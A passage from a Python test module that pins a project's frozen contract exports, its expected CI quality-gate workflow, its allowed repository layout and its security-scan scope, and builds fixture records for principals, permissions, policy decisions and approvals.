        ("ResultWarning", "class"),
        ("ERROR_CATEGORY_VALUES", "annotation"),
        ("ERROR_SEVERITY_VALUES", "annotation"),
    ),
    "events.py": (
        ("EventType", "class"),
        ("RuntimeEventType", "class"),
        ("RUNTIME_EVENT_TYPES", "annotation"),
        ("EventEnvelope", "class"),
    ),
    "evidence.py": (
        ("EvidenceKind", "class"),
        ("EvidenceReference", "class"),
        ("EVIDENCE_KIND_VALUES", "annotation"),
    ),
    "executions.py": (
        ("ExecutionState", "class"),
        ("ExecutionRecord", "class"),
        ("EXECUTION_STATE_VALUES", "annotation"),
    ),
    "identifiers.py": (
        ("CuriosId", "class"),
        ("ProjectId", "class"),
        ("ApplicationId", "class"),
        ("MilestoneId", "class"),
        ("WorkstreamId", "class"),
        ("WorkId", "class"),
        ("ExecutionId", "class"),
        ("AgentDefinitionId", "class"),
        ("AgentInstanceId", "class"),
        ("CapabilityId", "class"),
        ("ProviderId", "class"),
        ("ArtifactId", "class"),
        ("EvidenceId", "class"),
        ("VerificationId", "class"),
        ("EventId", "class"),
        ("TraceId", "class"),
        ("CorrelationId", "class"),
        ("IntentId", "class"),
        ("ProblemId", "class"),
        ("AssumptionId", "class"),
        ("DecisionId", "class"),
        ("PlanId", "class"),
        ("ensure_id_type", "function"),
        ("ID_TYPES", "annotation"),
        ("ID_PREFIXES", "annotation"),
    ),
    "lifecycle.py": (
        ("EngineeringLifecycle", "class"),
        ("ENGINEERING_LIFECYCLE_VALUES", "annotation"),
    ),
    "observability.py": (("ObservabilityContext", "class"),),
    "providers.py": (
        ("ProviderType", "class"),
        ("ProviderStatus", "class"),
        ("ProviderDescriptor", "class"),
        ("PROVIDER_TYPE_VALUES", "annotation"),
        ("PROVIDER_STATUS_VALUES", "annotation"),
    ),
    "references.py": (
        ("ReferenceKind", "class"),
        ("ObjectReference", "class"),
        ("REFERENCE_KIND_VALUES", "annotation"),
    ),
    "results.py": (
        ("ResultValueT", "assignment"),
        ("ResultStatus", "class"),
        ("Result", "class"),
        ("RESULT_STATUS_VALUES", "annotation"),
    ),
    "schema_version.py": (("SchemaVersion", "class"),),
    "security.py": (
        ("ConfigurationProfileName", "class"),
        ("PrincipalType", "class"),
        ("EffectClassification", "class"),
        ("RiskClassification", "class"),
        ("PolicyDecisionOutcome", "class"),
        ("ApprovalOutcome", "class"),
        ("ConfigurationProfile", "class"),
        ("SecretReference", "class"),
        ("Principal", "class"),
        ("Permission", "class"),
        ("Authority", "class"),
        ("PolicyDecision", "class"),
        ("Approval", "class"),
        ("CONFIGURATION_PROFILE_VALUES", "annotation"),
        ("PRINCIPAL_TYPE_VALUES", "annotation"),
        ("EFFECT_CLASSIFICATION_VALUES", "annotation"),
        ("GOVERNED_EFFECT_VALUES", "annotation"),
        ("RISK_CLASSIFICATION_VALUES", "annotation"),
        ("POLICY_DECISION_OUTCOME_VALUES", "annotation"),
        ("APPROVAL_OUTCOME_VALUES", "annotation"),
    ),
    "serialization.py": (
        ("SupportsJsonCompatible", "class"),
        ("to_json_compatible", "function"),
        ("JsonCompatible", "assignment"),
    ),
    "temporal.py": (
        ("UtcTimestamp", "class"),
        ("DurationMilliseconds", "class"),
    ),
    "verification.py": (
        ("VerificationOutcome", "class"),
        ("VerificationReference", "class"),
        ("VERIFICATION_OUTCOME_VALUES", "annotation"),
    ),
    "work.py": (
        ("WorkItemState", "class"),
        ("WorkItem", "class"),
        ("WORK_ITEM_STATE_VALUES", "annotation"),
    ),
}
FROZEN_CONTRACT_CLASS_MEMBERS_BY_MODULE = {
    "agents.py": {
        "AgentDefinition": (
            ("agent_definition_id", "annotation"),
            ("name", "annotation"),
            ("version", "annotation"),
            ("purpose", "annotation"),
            ("allowed_capability_ids", "annotation"),
            ("constraints", "annotation"),
            ("model_requirement_refs", "annotation"),
            ("input_contract_refs", "annotation"),
            ("output_contract_refs", "annotation"),
            ("from_json_compatible", "method"),
            ("to_json_compatible", "method"),
        ),
        "AgentInstance": (
            ("agent_instance_id", "annotation"),
            ("agent_definition_id", "annotation"),
            ("work_id", "annotation"),
            ("state", "annotation"),
            ("created_at", "annotation"),
            ("execution_id", "annotation"),
            ("observability_context", "annotation"),
            ("authority_ref", "annotation"),
            ("principal_ref", "annotation"),
            ("started_at", "annotation"),
            ("ended_at", "annotation"),
            ("from_json_compatible", "method"),
            ("to_json_compatible", "method"),
        ),
        "AgentInstanceState": (
            ("CREATED", "assignment"),
            ("READY", "assignment"),
            ("ACTIVE", "assignment"),
            ("WAITING", "assignment"),
            ("COMPLETED", "assignment"),
            ("FAILED", "assignment"),
            ("CANCELLED", "assignment"),
        ),
    },
    "capabilities.py": {
        "Capability": (
            ("capability_id", "annotation"),
            ("key", "annotation"),
            ("version", "annotation"),
            ("description", "annotation"),
            ("category", "annotation"),
            ("metadata", "annotation"),
            ("from_json_compatible", "method"),
            ("to_json_compatible", "method"),
        ),
        "CapabilityRequirement": (
            ("capability_id", "annotation"),
            ("quality", "annotation"),
            ("privacy_constraints", "annotation"),
            ("latency_budget_ms", "annotation"),
            ("cost_budget", "annotation"),
            ("resource_constraints", "annotation"),
            ("policy_constraint_refs", "annotation"),
            ("from_json_compatible", "method"),
            ("to_json_compatible", "method"),
        ),
    },
    "cognitive.py": {
        "Intent": (
            ("intent_id", "annotation"),
            ("objective", "annotation"),
            ("submitted_at", "annotation"),
            ("source_ref", "annotation"),
            ("context_refs", "annotation"),
            ("from_json_compatible", "method"),
            ("to_json_compatible", "method"),
        ),
        "Problem": (
            ("problem_id", "annotation"),
            ("intent_ref", "annotation"),
            ("objective", "annotation"),
            ("statement", "annotation"),
            ("created_at", "annotation"),
            ("context_refs", "annotation"),
            ("from_json_compatible", "method"),
            ("to_json_compatible", "method"),
        ),
        "Assumption": (
            ("assumption_id", "annotation"),
            ("subject_ref", "annotation"),
            ("statement", "annotation"),
            ("created_at", "annotation"),
            ("basis_refs", "annotation"),
            ("from_json_compatible", "method"),
            ("to_json_compatible", "method"),
        ),
        "Decision": (
            ("decision_id", "annotation"),
            ("subject_ref", "annotation"),
            ("question", "annotation"),
            ("selected_option", "annotation"),
            ("rationale", "annotation"),
            ("decided_at", "annotation"),
            ("input_refs", "annotation"),
            ("from_json_compatible", "method"),
            ("to_json_compatible", "method"),
        ),
        "Plan": (
            ("plan_id", "annotation"),
            ("problem_ref", "annotation"),
            ("objective", "annotation"),
            ("created_at", "annotation"),
            ("assumption_refs", "annotation"),
            ("decision_refs", "annotation"),
            ("work_refs", "annotation"),
            ("from_json_compatible", "method"),
            ("to_json_compatible", "method"),
        ),
    },
    "executions.py": {
        "ExecutionRecord": (
            ("execution_id", "annotation"),
            ("work_id", "annotation"),
            ("executor_ref", "annotation"),
            ("started_at", "annotation"),
            ("state", "annotation"),
            ("ended_at", "annotation"),
            ("agent_instance_id", "annotation"),
            ("provider_refs", "annotation"),
            ("result", "annotation"),
            ("evidence_refs", "annotation"),
            ("error_refs", "annotation"),
            ("errors", "annotation"),
            ("observability_context", "annotation"),
            ("from_json_compatible", "method"),
            ("to_json_compatible", "method"),
        ),
        "ExecutionState": (
            ("CREATED", "assignment"),
            ("RUNNING", "assignment"),
            ("WAITING", "assignment"),
            ("SUCCEEDED", "assignment"),
            ("FAILED", "assignment"),
            ("CANCELLED", "assignment"),
        ),
    },
    "providers.py": {
        "ProviderDescriptor": (
            ("provider_id", "annotation"),
            ("provider_type", "annotation"),
            ("version", "annotation"),
            ("declared_capability_ids", "annotation"),
            ("configuration_requirement_refs", "annotation"),
            ("status", "annotation"),
            ("implementation_metadata", "annotation"),
            ("from_json_compatible", "method"),
            ("to_json_compatible", "method"),
        ),
        "ProviderType": (
            ("MODEL", "assignment"),
            ("STORAGE", "assignment"),
            ("DATABASE", "assignment"),
            ("TOOL", "assignment"),
            ("RUNTIME", "assignment"),
            ("OTHER", "assignment"),
        ),
    },
    "references.py": {
        "ObjectReference": (
            ("kind", "annotation"),
            ("ref_id", "annotation"),
            ("from_id", "method"),
            ("from_json_compatible", "method"),
            ("to_json_compatible", "method"),
        ),
        "ReferenceKind": (
            ("PROJECT", "assignment"),
            ("APPLICATION", "assignment"),
            ("MILESTONE", "assignment"),
            ("WORKSTREAM", "assignment"),
            ("WORK", "assignment"),
            ("EXECUTION", "assignment"),
            ("AGENT_DEFINITION", "assignment"),
            ("AGENT_INSTANCE", "assignment"),
            ("CAPABILITY", "assignment"),
            ("PROVIDER", "assignment"),
            ("ARTIFACT", "assignment"),
            ("EVIDENCE", "assignment"),
            ("VERIFICATION", "assignment"),
            ("EVENT", "assignment"),
            ("TRACE", "assignment"),
            ("INTENT", "assignment"),
            ("PROBLEM", "assignment"),
            ("ASSUMPTION", "assignment"),
            ("DECISION", "assignment"),
            ("PLAN", "assignment"),
        ),
    },
    "security.py": {
        "EffectClassification": (
            ("READ_ONLY", "assignment"),
            ("LOCAL_WRITE", "assignment"),
            ("EXTERNAL_READ", "assignment"),
            ("EXTERNAL_WRITE", "assignment"),
            ("DESTRUCTIVE", "assignment"),
            ("SECRET_ACCESS", "assignment"),
            ("NETWORK_ACCESS", "assignment"),
            ("EXECUTION", "assignment"),
        ),
        "PolicyDecision": (
            ("subject_ref", "annotation"),
            ("principal", "annotation"),
            ("requested_effects", "annotation"),
            ("resource_refs", "annotation"),
            ("scope", "annotation"),
            ("outcome", "annotation"),
            ("reason", "annotation"),
            ("decided_at", "annotation"),
            ("decision_id", "annotation"),
            ("policy_refs", "annotation"),
            ("approval_id", "annotation"),
            ("observability_context", "annotation"),
            ("is_authorizing", "method"),
            ("from_json_compatible", "method"),
            ("to_json_compatible", "method"),
        ),
        "SecretReference": (
            ("name", "annotation"),
            ("scope", "annotation"),
            ("purpose", "annotation"),
            ("key", "annotation"),
            ("resolver_ref", "annotation"),
            ("secret_provider_ref", "annotation"),
            ("from_json_compatible", "method"),
            ("to_json_compatible", "method"),
        ),
    },
    "work.py": {
        "WorkItem": (
            ("work_id", "annotation"),
            ("work_type", "annotation"),
            ("title", "annotation"),
            ("objective", "annotation"),
            ("created_at", "annotation"),
            ("updated_at", "annotation"),
            ("state", "annotation"),
            ("dependencies", "annotation"),
            ("required_capabilities", "annotation"),
            ("inputs", "annotation"),
            ("expected_outputs", "annotation"),
            ("policy_constraint_refs", "annotation"),
            ("authority_ref", "annotation"),
            ("principal_ref", "annotation"),
            ("evidence_requirement_refs", "annotation"),
            ("from_json_compatible", "method"),
            ("to_json_compatible", "method"),
        ),
        "WorkItemState": (
            ("CREATED", "assignment"),
            ("READY", "assignment"),
            ("RUNNING", "assignment"),
            ("WAITING", "assignment"),
            ("COMPLETED", "assignment"),
            ("FAILED", "assignment"),
            ("CANCELLED", "assignment"),
        ),
    },
}
FROZEN_CONTRACT_INIT_IMPORTS = (
    (
        "curios_contracts.agents",
        (
            ("AGENT_INSTANCE_STATE_VALUES", None),
            ("AgentDefinition", None),
            ("AgentInstance", None),
            ("AgentInstanceState", None),
        ),
    ),
    (
        "curios_contracts.artifacts",
        (
            ("ARTIFACT_KIND_VALUES", None),
            ("INTEGRITY_ALGORITHM_VALUES", None),
            ("ArtifactKind", None),
            ("ArtifactReference", None),
            ("IntegrityAlgorithm", None),
            ("IntegrityDescriptor", None),
        ),
    ),
    (
        "curios_contracts.capabilities",
        (
            ("CAPABILITY_CATEGORY_VALUES", None),
            ("CAPABILITY_QUALITY_VALUES", None),
            ("Capability", None),
            ("CapabilityCategory", None),
            ("CapabilityQuality", None),
            ("CapabilityRequirement", None),
        ),
    ),
    (
        "curios_contracts.cognitive",
        (
            ("Assumption", None),
            ("Decision", None),
            ("Intent", None),
            ("Plan", None),
            ("Problem", None),
        ),
    ),
    (
        "curios_contracts.errors",
        (
            ("ERROR_CATEGORY_VALUES", None),
            ("ERROR_SEVERITY_VALUES", None),
            ("ContractError", None),
            ("ErrorCategory", None),
            ("ErrorCode", None),
            ("ErrorSeverity", None),
            ("ResultWarning", None),
        ),
    ),
    (
        "curios_contracts.events",
        (
            ("RUNTIME_EVENT_TYPES", None),
            ("EventEnvelope", None),
            ("EventType", None),
            ("RuntimeEventType", None),
        ),
    ),
    (
        "curios_contracts.evidence",
        (
            ("EVIDENCE_KIND_VALUES", None),
            ("EvidenceKind", None),
            ("EvidenceReference", None),
        ),
    ),
    (
        "curios_contracts.executions",
        (
            ("EXECUTION_STATE_VALUES", None),
            ("ExecutionRecord", None),
            ("ExecutionState", None),
        ),
    ),
    (
        "curios_contracts.identifiers",
        (
            ("ID_PREFIXES", None),
            ("ID_TYPES", None),
            ("AgentDefinitionId", None),
            ("AgentInstanceId", None),
            ("ApplicationId", None),
            ("ArtifactId", None),
            ("AssumptionId", None),
            ("CapabilityId", None),
            ("CorrelationId", None),
            ("CuriosId", None),
            ("DecisionId", None),
            ("EventId", None),
            ("EvidenceId", None),
            ("ExecutionId", None),
            ("IntentId", None),
            ("MilestoneId", None),
            ("PlanId", None),
            ("ProblemId", None),
            ("ProjectId", None),
            ("ProviderId", None),
            ("TraceId", None),
            ("VerificationId", None),
            ("WorkId", None),
            ("WorkstreamId", None),
            ("ensure_id_type", None),
        ),
    ),
    (
        "curios_contracts.lifecycle",
        (
            ("ENGINEERING_LIFECYCLE_VALUES", None),
            ("EngineeringLifecycle", None),
        ),
    ),
    (
        "curios_contracts.observability",
        (("ObservabilityContext", None),),
    ),
    (
        "curios_contracts.providers",
        (
            ("PROVIDER_STATUS_VALUES", None),
            ("PROVIDER_TYPE_VALUES", None),
            ("ProviderDescriptor", None),
            ("ProviderStatus", None),
            ("ProviderType", None),
        ),
    ),
    (
        "curios_contracts.references",
        (
            ("REFERENCE_KIND_VALUES", None),
            ("ObjectReference", None),
            ("ReferenceKind", None),
        ),
    ),
    (
        "curios_contracts.results",
        (
            ("RESULT_STATUS_VALUES", None),
            ("Result", None),
            ("ResultStatus", None),
        ),
    ),
    (
        "curios_contracts.schema_version",
        (("SchemaVersion", None),),
    ),
    (
        "curios_contracts.security",
        (
            ("APPROVAL_OUTCOME_VALUES", None),
            ("CONFIGURATION_PROFILE_VALUES", None),
            ("EFFECT_CLASSIFICATION_VALUES", None),
            ("GOVERNED_EFFECT_VALUES", None),
            ("POLICY_DECISION_OUTCOME_VALUES", None),
            ("PRINCIPAL_TYPE_VALUES", None),
            ("RISK_CLASSIFICATION_VALUES", None),
            ("Approval", None),
            ("ApprovalOutcome", None),
            ("Authority", None),
            ("ConfigurationProfile", None),
            ("ConfigurationProfileName", None),
            ("EffectClassification", None),
            ("Permission", None),
            ("PolicyDecision", None),
            ("PolicyDecisionOutcome", None),
            ("Principal", None),
            ("PrincipalType", None),
            ("RiskClassification", None),
            ("SecretReference", None),
        ),
    ),
    (
        "curios_contracts.serialization",
        (("to_json_compatible", None),),
    ),
    (
        "curios_contracts.temporal",
        (
            ("DurationMilliseconds", None),
            ("UtcTimestamp", None),
        ),
    ),
    (
        "curios_contracts.verification",
        (
            ("VERIFICATION_OUTCOME_VALUES", None),
            ("VerificationOutcome", None),
            ("VerificationReference", None),
        ),
    ),
    (
        "curios_contracts.work",
        (
            ("WORK_ITEM_STATE_VALUES", None),
            ("WorkItem", None),
            ("WorkItemState", None),
        ),
    ),
)
FROZEN_CONTRACT_INIT_STATEMENT_SEQUENCE = (
    (("docstring", None), None),
    *(((("import_from", module), names)) for module, names in FROZEN_CONTRACT_INIT_IMPORTS),
    (("assign", "__version__"), None),
    (("assign", "__all__"), None),
)
FROZEN_CONTRACT_INIT_DECLARATIONS = (("__version__", "assignment"),)
FROZEN_CONTRACT_PACKAGE_EXPORTS = (
    "AGENT_INSTANCE_STATE_VALUES",
    "ARTIFACT_KIND_VALUES",
    "APPROVAL_OUTCOME_VALUES",
    "CAPABILITY_CATEGORY_VALUES",
    "CAPABILITY_QUALITY_VALUES",
    "CONFIGURATION_PROFILE_VALUES",
    "ENGINEERING_LIFECYCLE_VALUES",
    "ERROR_CATEGORY_VALUES",
    "ERROR_SEVERITY_VALUES",
    "EFFECT_CLASSIFICATION_VALUES",
    "EVIDENCE_KIND_VALUES",
    "EXECUTION_STATE_VALUES",
    "GOVERNED_EFFECT_VALUES",
    "ID_PREFIXES",
    "ID_TYPES",
    "INTEGRITY_ALGORITHM_VALUES",
    "POLICY_DECISION_OUTCOME_VALUES",
    "PRINCIPAL_TYPE_VALUES",
    "PROVIDER_STATUS_VALUES",
    "PROVIDER_TYPE_VALUES",
    "REFERENCE_KIND_VALUES",
    "RESULT_STATUS_VALUES",
    "RISK_CLASSIFICATION_VALUES",
    "RUNTIME_EVENT_TYPES",
    "VERIFICATION_OUTCOME_VALUES",
    "WORK_ITEM_STATE_VALUES",
    "AgentDefinition",
    "AgentDefinitionId",
    "AgentInstance",
    "AgentInstanceId",
    "AgentInstanceState",
    "ApplicationId",
    "Assumption",
    "AssumptionId",
    "Approval",
    "ApprovalOutcome",
    "ArtifactId",
    "ArtifactKind",
    "ArtifactReference",
    "Authority",
    "Capability",
    "CapabilityCategory",
    "CapabilityId",
    "CapabilityQuality",
    "CapabilityRequirement",
    "ConfigurationProfile",
    "ConfigurationProfileName",
    "ContractError",
    "CorrelationId",
    "CuriosId",
    "Decision",
    "DecisionId",
    "DurationMilliseconds",
    "EffectClassification",
    "EngineeringLifecycle",
    "ErrorCategory",
    "ErrorCode",
    "ErrorSeverity",
    "EventEnvelope",
    "EventId",
    "EventType",
    "ExecutionRecord",
    "EvidenceKind",
    "EvidenceId",
    "EvidenceReference",
    "ExecutionState",
    "ExecutionId",
    "IntegrityAlgorithm",
    "IntegrityDescriptor",
    "Intent",
    "IntentId",
    "MilestoneId",
    "ObjectReference",
    "ObservabilityContext",
    "Permission",
    "PolicyDecision",
    "PolicyDecisionOutcome",
    "Plan",
    "PlanId",
    "Principal",
    "PrincipalType",
    "Problem",
    "ProblemId",
    "ProjectId",
    "ProviderDescriptor",
    "ProviderId",
    "ProviderStatus",
    "ProviderType",
    "ReferenceKind",
    "Result",
    "ResultStatus",
    "ResultWarning",
    "RiskClassification",
    "RuntimeEventType",
    "SchemaVersion",
    "SecretReference",
    "TraceId",
    "UtcTimestamp",
    "VerificationOutcome",
    "VerificationId",
    "VerificationReference",
    "WorkItem",
    "WorkItemState",
    "WorkId",
    "WorkstreamId",
    "__version__",
    "ensure_id_type",
    "to_json_compatible",
)
M1_PLANNED_CANONICAL_AUTHORITY_BY_TASK = {
    "TASK-M1-009": frozenset({"model/profile discovery records"}),
    "TASK-M1-010": frozenset({"routing decision records"}),
}
M1_AUTHORIZED_CANONICAL_AUTHORITY_BY_TASK = {
    "TASK-M1-002": frozenset(
        {
            "Intent",
            "Problem",
            "Assumption",
            "Decision",
            "Plan",
            "IntentId",
            "ProblemId",
            "AssumptionId",
            "DecisionId",
            "PlanId",
        }
    ),
    "TASK-M1-004": frozenset({"bounded work-DAG records"}),
}
M1_EXISTING_FROZEN_CONTRACT_AUTHORITY_USED_BY_FUTURE_TASKS = frozenset(
    {
        "AgentDefinition",
        "AgentInstance",
        "Capability",
        "CapabilityRequirement",
        "ObjectReference",
        "WorkItem",
    }
)
M0_INTEGRATION_GATE_COMMAND = (
    "uv run pytest tests/integration/test_m0_vertical_slice_integration.py -q"
)
AUTHORIZED_WORKFLOW_TOP_LEVEL_KEYS = frozenset({"name", "on", "permissions", "jobs"})
EXPECTED_QUALITY_GATES_WORKFLOW = {
    "name": "Quality Gates",
    "on": AUTHORIZED_WORKFLOW_TRIGGERS,
    "permissions": AUTHORIZED_WORKFLOW_PERMISSIONS,
    "jobs": {
        "python": {
            "name": "Python, Backend, Providers, Integration",
            "runs-on": "ubuntu-24.04",
            "timeout-minutes": "45",
            "steps": (
                {
                    "name": "Check out repository",
                    "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
                },
                {
                    "name": "Set up Python",
                    "uses": "actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97",
                    "with": {"python-version": "3.14"},
                },
                {
                    "name": "Set up uv",
                    "uses": "astral-sh/setup-uv@c771a70e6277c0a99b617c7a806ffedaca235ff9",
                },
                {
                    "name": "Validate TOML manifests",
                    "run": """
                    python - <<'PY'
                    from pathlib import Path
                    import tomllib

                    for path in sorted(Path(".").rglob("pyproject.toml")):
                        tomllib.loads(path.read_text(encoding="utf-8"))
                    PY
                    """,
                },
                {"name": "Check uv lock consistency", "run": "uv lock --check"},
                {
                    "name": "Install locked Python workspace",
                    "run": "uv sync --locked --all-groups --all-packages",
                },
                {
                    "name": "Validate LOCAL_DOCKER PostgreSQL compose config",
                    "run": """
                    docker compose
                    --env-file infrastructure/local/docker/.env.example
                    -f infrastructure/local/docker/compose.yaml
                    config --quiet
                    """,
                },
                {"name": "Ruff lint", "run": "uv run ruff check ."},
                {"name": "Ruff format check", "run": "uv run ruff format --check ."},
                {
                    "name": "mypy strict baseline",
                    "run": "uv run mypy apps/api/src packages/python/*/src",
                },
                {
                    "name": "Package-local Python tests",
                    "run": """
                    uv run pytest
                    apps/api/tests
                    packages/python/curios_contracts/tests
                    packages/python/curios_core/tests
                    packages/python/curios_config/tests
                    packages/python/curios_postgres_provider/tests
                    packages/python/curios_ollama/tests
                    packages/python/curios_observability/tests
                    -q
                    """,
                },
                {
                    "name": "M0 runtime, persistence, and policy package tests",
                    "run": """
                    uv run pytest
                    packages/python/curios_persistence/tests
                    packages/python/curios_policy/tests
                    packages/python/curios_runtime/tests
                    -m "not integration"
                    -q
                    """,
                },
                {
                    "name": "Repository contract and schema tests",
                    "run": "uv run pytest tests/contract tests/schema -q",
                },
                {"name": "Architecture tests", "run": "uv run pytest tests/architecture -q"},
                {"name": "Security tests", "run": "uv run pytest tests/security -q"},
                {
                    "name": "API integration tests",
                    "run": "uv run pytest tests/integration/test_api_integration.py -q",
                },
                {
                    "name": "PostgreSQL provider integration test",
                    "run": (
                        "uv run pytest tests/integration/test_postgres_provider_integration.py -q"
                    ),
                },
                {
                    "name": "M0 PostgreSQL integration tests",
                    "run": """
                    uv run pytest
                    packages/python/curios_persistence/tests/test_postgres_persistence_integration.py
                    packages/python/curios_runtime/tests/test_postgres_event_evidence_store_integration.py
                    packages/python/curios_runtime/tests/test_postgres_work_repository_integration.py
                    -q
                    """,
                },
                {"name": "M0 integration tests", "run": M0_INTEGRATION_GATE_COMMAND},
                {"name": "BOOT acceptance tests", "run": "uv run pytest tests/acceptance -q"},
                {"name": "Full pytest suite", "run": "uv run pytest -q"},
            ),
        },
        "frontend": {
            "name": "Frontend",
            "runs-on": "ubuntu-24.04",
            "timeout-minutes": "15",
            "steps": (
                {
                    "name": "Check out repository",
                    "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
                },
                {
                    "name": "Set up Node.js",
                    "uses": "actions/setup-node@820762786026740c76f36085b0efc47a31fe5020",
                    "with": {"node-version": "24"},
                },
                {
                    "name": "Enable pinned pnpm",
                    "run": """
                    corepack enable
                    corepack prepare pnpm@12.5.1 --activate
                    """,
                },
                {
                    "name": "Install locked Node workspace",
                    "run": "pnpm install --frozen-lockfile",
                },
                {"name": "Repository frontend checks", "run": "pnpm check"},
                {"name": "apps/web tests", "run": "pnpm --dir apps/web test"},
                {"name": "apps/web typecheck", "run": "pnpm --dir apps/web typecheck"},
                {"name": "apps/web production build", "run": "pnpm --dir apps/web build"},
            ),
        },
        "repository": {
            "name": "Repository Hygiene",
            "runs-on": "ubuntu-24.04",
            "timeout-minutes": "5",
            "steps": (
                {
                    "name": "Check out repository",
                    "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
                },
                {"name": "Diff whitespace", "run": "git diff --check"},
            ),
        },
    },
}
ALLOWED_TOP_LEVEL_PATHS = frozenset(
    {
        ".github",
        ".editorconfig",
        ".gitignore",
        ".prettierignore",
        "README.md",
        "apps",
        "docs",
        "eslint.config.mjs",
        "infrastructure",
        "package.json",
        "packages",
        "pnpm-lock.yaml",
        "pnpm-workspace.yaml",
        "prettier.config.mjs",
        "pyproject.toml",
        "tests",
        "tooling",
        "tsconfig.base.json",
        "tsconfig.json",
        "uv.lock",
    }
)


class _QualityGateWorkflowLoader(yaml.BaseLoader):
    """Fail-closed YAML loader for security-sensitive workflow audits."""


def _construct_workflow_mapping(
    loader: _QualityGateWorkflowLoader, node: yaml.nodes.Node, deep: bool = False
) -> dict[object, object]:
    if not isinstance(node, MappingNode):
        raise ConstructorError(
            "while constructing a workflow mapping",
            node.start_mark,
            f"expected a mapping node, got {node.id}",
            node.start_mark,
        )

    mapping: dict[object, object] = {}
    for key_node, value_node in node.value:
        key = loader.construct_object(key_node, deep=deep)
        if key == "<<":
            raise ConstructorError(
                "while constructing a workflow mapping",
                node.start_mark,
                "YAML merge keys are not authorized in the quality-gates workflow",
                key_node.start_mark,
            )
        if key in mapping:
            raise ConstructorError(
                "while constructing a workflow mapping",
                node.start_mark,
                f"duplicate YAML mapping key is not authorized: {key!r}",
                key_node.start_mark,
            )
        mapping[key] = loader.construct_object(value_node, deep=deep)
    return mapping


_QualityGateWorkflowLoader.add_constructor(
    yaml.resolver.BaseResolver.DEFAULT_MAPPING_TAG,
    _construct_workflow_mapping,
)
ALLOWED_APP_ROOTS = frozenset(
    {
        "apps/api",
        "apps/web",
    }
)
ALLOWED_PACKAGE_ROOTS = frozenset(
    {
        "packages/python/curios_config",
        "packages/python/curios_contracts",
        "packages/python/curios_core",
        "packages/python/curios_capability",
        "packages/python/curios_cognitive",
        "packages/python/curios_dag",
        "packages/python/curios_ollama",
        "packages/python/curios_observability",
        "packages/python/curios_persistence",
        "packages/python/curios_policy",
        "packages/python/curios_postgres_provider",
        "packages/python/curios_runtime",
        "packages/typescript/curios-contracts",
    }
)
ALLOWED_CORE_SOURCE_FILES = frozenset(
    {
        "__init__.py",
        "application.py",
        "context.py",
        "ports/__init__.py",
        "ports/providers.py",
        "py.typed",
    }
)
ALLOWED_CORE_EXPORTS = frozenset(
    {
        "CoreContext",
        "CoreServices",
        "ProviderCatalog",
        "ProviderDescriptorsResult",
        "__version__",
    }
)
SECRET_FIELD_ALLOWLIST: dict[type[Any], frozenset[str]] = {
    SecretReference: frozenset(
        {
            "key",
            "name",
            "purpose",
            "resolver_ref",
            "scope",
            "secret_provider_ref",
        }
    )
}
SECURITY_SCAN_ROOTS = (
    ".github/workflows",
    "apps/api/src",
    "apps/api/tests",
    "apps/web",
    "docs",
    "infrastructure",
    "packages/python/curios_config/src",
    "packages/python/curios_contracts/src",
    "packages/python/curios_core/src",
    "packages/python/curios_observability/src",
    "packages/python/curios_policy/src",
    "packages/python/curios_policy/tests",
    "packages/python/curios_ollama/src",
    "packages/python/curios_persistence/src",
    "packages/python/curios_postgres_provider/src",
    "packages/python/curios_runtime/src",
    "packages/python/curios_runtime/tests",
    "packages/typescript/curios-contracts/src",
    "tests/acceptance",
    "tests/integration",
)
SECURITY_SCAN_ROOT_FILES = frozenset(
    {
        ".editorconfig",
        ".gitignore",
        ".prettierignore",
        "README.md",
        "eslint.config.mjs",
        "package.json",
        "pnpm-workspace.yaml",
        "prettier.config.mjs",
        "pyproject.toml",
        "tsconfig.base.json",
        "tsconfig.json",
    }
)
SECURITY_SCAN_SUFFIXES = frozenset(
    {
        ".env.example",
        ".css",
        ".html",
        ".js",
        ".json",
        ".md",
        ".mjs",
        ".py",
        ".toml",
        ".ts",
        ".tsx",
        ".txt",
        ".yaml",
        ".yml",
    }
)


def _provider_ref() -> ObjectReference:
    return ObjectReference.from_id(fixed_id(ProviderId))


def _project_ref() -> ObjectReference:
    return ObjectReference.from_id(fixed_id(ProjectId))


def _security_records() -> tuple[object, ...]:
    principal = Principal(
        principal_type=PrincipalType.HUMAN,
        identity="operator@example.test",
        principal_ref=_project_ref(),
        execution_ref=ObjectReference.from_id(fixed_id(ExecutionId)),
    )
    permission = Permission(
        action="read",
        resource_type="artifact",
        resource_ref=ObjectReference.from_id(fixed_id(ArtifactId)),
        scope="project sandbox",
        permitted_effects=(EffectClassification.READ_ONLY,),
    )
    authority = Authority(
        authority_id="authz-local-read",
        principal=principal,
        permissions=(permission,),
        scope="project sandbox",
        granted_at=UTC_NOW,
        expires_at=UTC_LATER,
        provenance_refs=(fixed_id(EvidenceId),),
        approval_id="approval-local-read",
    )
    policy_decision = PolicyDecision(
        decision_id="decision-unknown",
        subject_ref=ObjectReference.from_id(fixed_id(WorkId)),
        principal=principal,
        requested_effects=(EffectClassification.SECRET_ACCESS,),
        resource_refs=(_provider_ref(),),
        scope="project sandbox",
        outcome=PolicyDecisionOutcome.UNKNOWN,
        reason="policy unavailable",
        policy_refs=(ObjectReference.from_id(fixed_id(EventId)),),
        decided_at=UTC_NOW,
        observability_context=ObservabilityContext(
            trace_id=None,
            principal_ref=ObjectReference.from_id(fixed_id(ProjectId)),
        ),
    )
    approval = Approval(
        approval_id="approval-secret-read",
        requested_by=principal,
        subject_ref=ObjectReference.from_id(fixed_id(WorkId)),
        action="read_secret",
        requested_effects=(EffectClassification.SECRET_ACCESS,),
        scope="project sandbox",
        reason="bounded review fixture",
        outcome=ApprovalOutcome.PENDING,
        requested_at=UTC_NOW,
        expires_at=UTC_LATER,
        evidence_refs=(fixed_id(EvidenceId),),
    )
    secret_reference = SecretReference(
        secret_provider_ref=_provider_ref(),
        name="model_provider_key",
        key="current",
        scope="local docker project",
        purpose="provider lookup",
    )
    configuration = ConfigurationProfile(
        profile=ConfigurationProfileName.LOCAL_DOCKER,
        description="Local Docker development profile identity.",
    )
    return (
        configuration,
        secret_reference,
        principal,
        permission,
        authority,
        policy_decision,
        approval,
    )


def _walk(value: object) -> tuple[object, ...]:
    nodes: list[object] = [value]
    if isinstance(value, dict):
        for key, item in value.items():
            nodes.extend((key, *_walk(item)))
    elif isinstance(value, list | tuple):
        for item in value:
            nodes.extend(_walk(item))
